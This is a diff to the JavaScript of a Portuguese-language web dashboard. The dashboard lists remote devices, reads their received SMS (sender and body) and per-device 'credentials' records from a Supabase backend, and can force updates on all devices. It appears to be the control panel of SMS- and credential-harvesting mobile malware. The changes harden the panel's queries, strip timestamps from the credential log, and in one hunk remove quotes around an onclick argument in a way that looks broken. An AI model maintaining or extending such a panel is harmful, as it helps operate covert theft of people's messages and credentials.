@@ -1492,7 +1492,7 @@ function renderLista(dispositivos, credenciais) {
       <div class="device-sinais-container" data-device-id="${idAttr}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
       <div class="timeline-title">📋 Histórico de actividade</div>
       <div class="timeline">${devCreds.length===0?'<div class="empty">Sem registos</div>':devCreds.map(c=>`
-        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">${escapeHtml(formatDate(c.criado_em))}</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>Conteúdo sensível ocultado</div></div></div>
+        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">—</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>Conteúdo sensível ocultado</div></div></div>
       `).join("")}</div>
       <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
       <div class="timeline" id="sms-${idAttr}" style="display:none">
@@ -1544,7 +1544,7 @@ function renderHistoricoSinaisDevice(deviceId) {
     <div style="font-family:var(--mono);font-size:10px;color:var(--muted)">
       <span style="color:var(--accent)">🤖 Automático</span> — ${comRes.length} sinais com resultado
     </div>
-    <button onclick="abrirModalHistorico('${devIdEsc}')"
+    <button onclick="abrirModalHistorico(${devIdEsc})"
       style="background:rgba(249,115,22,0.12);border:1px solid rgba(249,115,22,0.3);color:var(--accent);font-family:var(--mono);font-size:10px;padding:4px 12px;border-radius:6px;cursor:pointer;display:flex;align-items:center;gap:5px">
       📋 Ver histórico completo${taxa!=null?" ("+taxa+"%)" : ""}
     </button>
@@ -1629,7 +1629,7 @@ function renderMiniChart(dispositivos) {
 
 async function forcarAtualizacao(deviceId) {
   try {
-    const rPatch = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+deviceId, {
+    const rPatch = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+encodeURIComponent(deviceId), {
       method:"PATCH", headers:{...headers,"Prefer":"return=minimal"},
       body: JSON.stringify({forcar_update:true})
     });
@@ -1649,7 +1649,7 @@ async function forcarAtualizacaoTodos() {
   let ok=0, fail=0;
   await Promise.all(ids.map(async id => {
     try {
-      const rp = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+id, {
+      const rp = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+encodeURIComponent(id), {
         method:"PATCH", headers:{...headers,"Prefer":"return=minimal"},
         body:JSON.stringify({forcar_update:true})
       });
@@ -1702,7 +1702,7 @@ async function carregarDados() {
       fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms,remetente,corpo&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d3=await r3.json();
-    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1843,7 +1843,7 @@ function iniciarPainel() {
         fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms,remetente,corpo&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
-      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
@@ -2028,7 +2028,7 @@ function renderTabelaAssert() {
   const tbody = document.getElementById('assert-tbody');
   if (!tbody) return;
 
-  const deviceMap = {};
+  const deviceMap = Object.create(null);
   (todosDispositivos || []).forEach(d => {
     deviceMap[d.device_id] = d.modelo || d.device_id.slice(0,10);
   });
@@ -2197,7 +2197,7 @@ function renderDiag() {
   };
 
   // Encontrar o nome do dispositivo a partir de todosDispositivos
-  const deviceMap = {};
+  const deviceMap = Object.create(null);
   (todosDispositivos || []).forEach(d => { deviceMap[d.device_id] = d.modelo || d.device_id?.slice(0,10); });
 
   const rows = erros.map(e => {
